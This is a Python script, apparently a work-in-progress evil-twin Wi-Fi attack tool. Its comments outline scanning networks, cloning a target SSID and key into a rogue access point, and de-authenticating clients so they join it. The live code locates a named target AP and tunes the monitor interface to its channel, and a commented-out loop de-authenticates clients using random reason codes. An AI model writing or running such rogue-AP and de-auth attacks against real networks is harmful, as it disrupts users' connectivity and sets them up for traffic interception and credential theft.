# Get SSIDS in wifi medium (scan network)

# Choose one SSID to emulate - e.g. based on WPA2, name, number of clients connected to it

# Can we crack the key in order to create our own AP? if not go to next..

# Create rogue AP with same SSID+key

# Send beacon frames where we look like good AP (but we are the bad AP)

# De-auth clients connected to SSID

# Let clients connect to our rogue AP

import random
from scapy.all import Dot11Beacon, Dot11, Dot11Elt, sniff
from threading import Thread
import os
import time
import pandas

from get_ap import get_ap
from deauth import deauth_clients
# from get_clients_on_ap


INTERFACE = "wlan0mon"
TIMEOUT = 10

AP_info = get_ap(timeout=TIMEOUT, interface=INTERFACE, specific_ap="Sams 9")

print(AP_info)

channel = AP_info.Channel[0]
BSSID = AP_info.index[0]

print(AP_info.Channel)
print(BSSID[0])
# change channel to be on APs channel
os.system(f"iwconfig {INTERFACE} channel {channel}")
# clients = get_clients_on_ap(timeout=10, iface=INTERFACE, BSSID=BSSID)

# # Deauth clients
# while True:
#     print("Deauthenticating clients...")
#     reason_code = random.randint(1, 68)
#     deauth_clients(iface=INTERFACE, clients=clients, AP_mac=BSSID, reasoncode=reason_code)





# # initialize the networks dataframe that will contain all access points nearby
# networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
# # set the index BSSID (MAC address of the AP)
# networks.set_index("BSSID", inplace=True)


# # interface name, check using iwconfig
# interface = "wlan0mon"
# # start the thread that prints all the networks
# printer = Thread(target=print_all)
# printer.daemon = True
# printer.start()

# # start the channel changer
# channel_changer = Thread(target=change_channel)
# channel_changer.daemon = True
# channel_changer.start()


# # start sniffing
# sniff(prn=callback, iface=interface)


